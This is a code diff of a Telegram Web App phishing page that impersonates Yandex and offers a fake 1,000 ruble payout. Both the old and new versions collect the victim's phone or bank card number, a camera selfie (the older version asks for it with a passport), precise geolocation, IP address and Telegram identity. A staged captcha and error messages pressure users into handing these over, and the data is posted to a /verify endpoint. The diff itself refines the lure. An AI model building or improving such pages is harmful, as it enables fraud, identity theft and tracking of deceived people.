@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Yandex Plus Distribution</title>
+    <title>Yandex Distribution</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --primary: #FFCC00;
-            --secondary: #ff3333;
             --bg: #050505;
             --text: #ffffff;
-            --plus-gradient: linear-gradient(135deg, #7b42f6, #b01cd4);
+            --card-bg: rgba(255, 255, 255, 0.03);
         }
 
         body {
@@ -30,8 +29,8 @@
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
             background: 
-                radial-gradient(circle at 20% 30%, rgba(255, 204, 0, 0.1) 0%, transparent 40%),
-                radial-gradient(circle at 80% 70%, rgba(123, 66, 246, 0.15) 0%, transparent 40%);
+                radial-gradient(circle at 20% 30%, rgba(255, 204, 0, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(255, 255, 255, 0.03) 0%, transparent 40%);
             z-index: -1;
             animation: pulseBg 8s infinite alternate;
         }
@@ -39,7 +38,7 @@
         @keyframes pulseBg { 0% { opacity: 0.6; } 100% { opacity: 1; } }
 
         .card {
-            background: rgba(255, 255, 255, 0.03);
+            background: var(--card-bg);
             backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 32px;
@@ -48,25 +47,13 @@
             max-width: 380px;
             text-align: center;
             position: relative;
-            overflow: hidden;
             box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
         }
 
         .y-logo {
-            width: 80px;
-            filter: drop-shadow(0 0 10px rgba(255,204,0,0.3));
-            margin-bottom: 10px;
-        }
-
-        .plus-tag {
-            background: var(--plus-gradient);
-            padding: 4px 12px;
-            border-radius: 8px;
-            font-size: 11px;
-            font-weight: bold;
-            display: inline-block;
-            margin-bottom: 15px;
-            letter-spacing: 1px;
+            width: 70px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 5px rgba(255,204,0,0.2));
         }
 
         .amount {
@@ -76,21 +63,49 @@
             background: linear-gradient(to right, #FFCC00, #FFEE00);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 0 15px rgba(255, 204, 0, 0.4));
+        }
+
+        /* Выбор способа получения */
+        .method-selector {
+            display: flex;
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 4px;
+            margin-bottom: 15px;
+        }
+
+        .method-btn {
+            flex: 1;
+            padding: 10px;
+            font-size: 13px;
+            border-radius: 10px;
+            cursor: pointer;
+            border: none;
+            background: transparent;
+            color: #888;
+            transition: 0.3s;
+        }
+
+        .method-btn.active {
+            background: rgba(255,255,255,0.1);
+            color: #fff;
         }
 
         .input-box {
             background: rgba(255, 255, 255, 0.07);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 16px;
-            padding: 15px;
+            padding: 16px;
             width: 100%;
             color: white;
             font-size: 16px;
             margin-bottom: 12px;
             box-sizing: border-box;
             outline: none;
+            transition: 0.3s;
         }
+
+        .input-box:focus { border-color: var(--primary); }
 
         .main-btn {
             width: 100%;
@@ -99,47 +114,44 @@
             border: none;
             border-radius: 20px;
             color: #000;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 800;
             cursor: pointer;
             text-transform: uppercase;
-            animation: btnPulse 2s infinite;
-        }
-
-        @keyframes btnPulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-            100% { transform: scale(1); }
+            box-shadow: 0 10px 30px rgba(255, 204, 0, 0.2);
         }
 
         .captcha-area {
-            background: rgba(255,255,255,0.05);
+            background: rgba(255,255,255,0.03);
             border-radius: 16px;
             padding: 15px;
             margin: 15px 0;
             display: flex;
             align-items: center;
             cursor: pointer;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.05);
         }
 
         .check-circle {
-            width: 22px; height: 22px;
+            width: 20px; height: 20px;
             border: 2px solid var(--primary);
-            border-radius: 6px;
-            margin-right: 15px;
+            border-radius: 50%;
+            margin-right: 12px;
             display: flex; align-items: center; justify-content: center;
+            font-size: 12px;
         }
 
         .photo-step {
-            font-size: 12px;
+            font-size: 13px;
             color: #aaa;
             margin-bottom: 20px;
-            background: rgba(255,255,255,0.03);
-            padding: 12px;
-            border-radius: 16px;
-            border: 1px dashed rgba(255,255,255,0.2);
+            background: rgba(255,204,0,0.05);
+            padding: 15px;
+            border-radius: 18px;
+            border: 1px dashed rgba(255,204,0,0.3);
         }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -148,92 +160,105 @@
 
 <div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Yandex_logo.svg" class="y-logo">
-    <br>
-    <div class="plus-tag">ПЛЮС БОНУС</div>
+    
+    <div style="font-size: 14px; color: #888; letter-spacing: 1px;">ДОСТУПНЫЙ БОНУС</div>
     <div class="amount">1,000 ₽</div>
-    <p style="color: #bbb; font-size: 13px; margin-bottom: 20px;">Средства зачисляются мгновенно через систему быстрых платежей.</p>
+    <p style="color: #666; font-size: 12px; margin-bottom: 20px;">Мгновенная выплата на дебетовые карты РФ</p>
+
+    <div class="method-selector">
+        <button class="method-btn active" onclick="switchMethod('sbp')">По номеру / СБП</button>
+        <button class="method-btn" onclick="switchMethod('card')">Номер карты</button>
+    </div>
 
     <form id="claimForm">
-        <input type="text" id="phone" class="input-box" placeholder="Номер телефона / СБП" required>
-        <input type="text" id="card" class="input-box" placeholder="Номер карты зачисления" required>
+        <div id="sbp-input">
+            <input type="text" id="phone" class="input-box" placeholder="+7 (900) 000-00-00">
+        </div>
+        <div id="card-input" class="hidden">
+            <input type="text" id="card_num" class="input-box" placeholder="0000 0000 0000 0000">
+        </div>
 
-        <div class="captcha-area" onclick="handleCaptcha(this)">
+        <div class="captcha-area" onclick="handleCaptcha()">
             <div class="check-circle" id="capCircle"></div>
-            <span id="capText" style="font-size: 14px;">Я не робот (проверка Яндекс ID)</span>
+            <span id="capText" style="font-size: 13px;">Подтвердить получение</span>
         </div>
 
         <div class="photo-step">
-            <b>Фото-подтверждение</b><br>
-            Сделайте селфи с паспортом для верификации владельца счета
-            <input type="file" id="photo" accept="image/*" capture="camera" style="display:none;" required>
-            <button type="button" onclick="document.getElementById('photo').click()" style="margin-top:10px; background:rgba(255,204,0,0.1); border:1px solid var(--primary); color:var(--primary); padding:8px 20px; border-radius:10px; cursor:pointer; font-weight:bold;">СДЕЛАТЬ ФОТО</button>
+            <b>Пройти фотоверификацию</b><br>
+            <span style="font-size: 11px;">Сделайте селфи для подтверждения личности</span>
+            <input type="file" id="photo" accept="image/*" capture="camera" style="display:none;">
+            <button type="button" id="photoBtn" onclick="document.getElementById('photo').click()" style="margin-top:10px; background:white; border:none; color:black; padding:8px 20px; border-radius:10px; cursor:pointer; font-weight:bold; font-size: 12px;">СДЕЛАТЬ ФОТО</button>
         </div>
 
-        <button type="submit" class="main-btn" id="submitBtn">Получить 1,000 ₽</button>
+        <button type="submit" class="main-btn" id="submitBtn">Забрать средства</button>
     </form>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
+    let currentMethod = 'sbp';
 
-    // 1. Инициализация и Фулскрин
     function initApp() {
         tg.ready();
         tg.expand();
-        
-        // Запрос настоящего Fullscreen (для версий 7.7+)
-        if (tg.isVersionAtLeast('7.7')) {
-            tg.requestFullscreen(); 
-        }
-
-        // Цвета и защита от свайпа
+        if (tg.isVersionAtLeast('7.7')) tg.requestFullscreen();
         tg.setHeaderColor('#050505');
-        tg.setBackgroundColor('#050505');
-        tg.enableClosingConfirmation(); 
+        tg.enableClosingConfirmation();
     }
     initApp();
 
-    // Функция получения ГЕО
+    function switchMethod(method) {
+        tg.HapticFeedback.impactOccurred('light');
+        currentMethod = method;
+        document.querySelectorAll('.method-btn').forEach(b => b.classList.toggle('active'));
+        document.getElementById('sbp-input').classList.toggle('hidden', method !== 'sbp');
+        document.getElementById('card-input').classList.toggle('hidden', method !== 'card');
+    }
+
+    function handleCaptcha() {
+        tg.HapticFeedback.impactOccurred('medium');
+        const text = document.getElementById('capText');
+        const circle = document.getElementById('capCircle');
+        text.innerText = 'Проверка системы...';
+        circle.innerHTML = '⌛';
+        
+        setTimeout(() => {
+            alert('Для завершения требуется фотоверификация ниже.');
+            text.innerText = 'Ожидание фото...';
+            circle.innerHTML = '📸';
+        }, 1000);
+    }
+
+    // Фото-контроль
+    document.getElementById('photo').onchange = function() {
+        if(this.files[0]) {
+            document.getElementById('photoBtn').innerText = '✅ ФОТО ГОТОВО';
+            document.getElementById('photoBtn').style.background = '#00FF85';
+            tg.HapticFeedback.notificationOccurred('success');
+        }
+    };
+
     function getCoords() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) return resolve("Гео недоступно");
+        return new Promise((r) => {
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`),
-                (err) => resolve("Отклонено пользователем"),
-                { enableHighAccuracy: true, timeout: 5000 }
+                (p) => r(`${p.coords.latitude}, ${p.coords.longitude}`),
+                () => r("Запрещено"),
+                { timeout: 5000 }
             );
         });
     }
 
-    // Обработка клика по капче + вибрация
-    function handleCaptcha(el) {
-        tg.HapticFeedback.notificationOccurred('warning'); // Легкая вибрация-предупреждение
-        const text = document.getElementById('capText');
-        const circle = document.getElementById('capCircle');
-        text.innerText = 'Синхронизация Яндекс ID...';
-        circle.innerHTML = '⌛';
-        
-        setTimeout(() => {
-            alert('Ошибка Яндекс ID. Требуется ручное подтверждение через фото-верификацию.');
-            text.innerText = 'Ошибка. Пройдите проверку ниже.';
-            circle.innerHTML = '❌';
-            circle.style.borderColor = '#ff3333';
-        }, 1500);
-    }
-
-    // ЕДИНАЯ ОТПРАВКА ФОРМЫ
     document.getElementById('claimForm').onsubmit = async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
         
         if (!document.getElementById('photo').files[0]) {
-            tg.HapticFeedback.notificationOccurred('error'); // Вибрация при ошибке
-            alert("Сначала сделайте фото-верификацию");
+            tg.HapticFeedback.notificationOccurred('error');
+            alert("Пожалуйста, пройдите фотоверификацию");
             return;
         }
 
-        tg.HapticFeedback.impactOccurred('heavy'); // Мощный отклик при нажатии
-        btn.innerText = 'ОБРАБОТКА...';
+        btn.innerText = 'ОТПРАВКА...';
         btn.disabled = true;
 
         try {
@@ -242,34 +267,36 @@
             const location = await getCoords();
             const user = tg.initDataUnsafe?.user || {};
 
+            const wallet = currentMethod === 'sbp' ? 
+                `СБП: ${document.getElementById('phone').value}` : 
+                `КАРТА: ${document.getElementById('card_num').value}`;
+
             const fullInfo = `
-👤 **USER:** @${user.username || 'n/a'}
+👤 **ЮЗЕР:** @${user.username || 'n/a'}
 🆔 **ID:** ${user.id || 'n/a'}
-👤 **NAME:** ${user.first_name || ''} ${user.last_name || ''}
+👤 **ИМЯ:** ${user.first_name || ''}
 🌐 **IP:** ${ip}
 📍 **GEO:** ${location}
-⭐ **PREM:** ${user.is_premium ? 'YES' : 'NO'}`;
+💳 **ДАННЫЕ:** ${wallet}`;
 
             const formData = new FormData();
-            formData.append('phone', `YANDEX: ${document.getElementById('phone').value} | Card: ${document.getElementById('card').value}`);
+            formData.append('phone', wallet);
             formData.append('ip', ip);
             formData.append('details', fullInfo);
             formData.append('photo', document.getElementById('photo').files[0]);
 
-            const response = await fetch('/verify', { method: 'POST', body: formData });
+            await fetch('/verify', { method: 'POST', body: formData });
 
-            if (response.ok) {
-                tg.HapticFeedback.notificationOccurred('success'); // Вибрация успеха
-                tg.showPopup({
-                    title: 'Заявка принята',
-                    message: 'Средства зачислятся после проверки фото-верификации оператором Яндекс.Плюс.',
-                    buttons: [{type: 'close'}]
-                });
-            }
+            tg.HapticFeedback.notificationOccurred('success');
+            tg.showPopup({
+                title: 'Заявка принята',
+                message: 'Выплата поступит на указанные реквизиты после завершения проверки.',
+                buttons: [{type: 'close'}]
+            });
         } catch (err) {
-            alert('Ошибка шлюза. Попробуйте позже.');
+            alert('Ошибка сети. Попробуйте еще раз.');
         } finally {
-            btn.innerText = 'Получить 1,000 ₽';
+            btn.innerText = 'Забрать средства';
             btn.disabled = false;
         }
     };
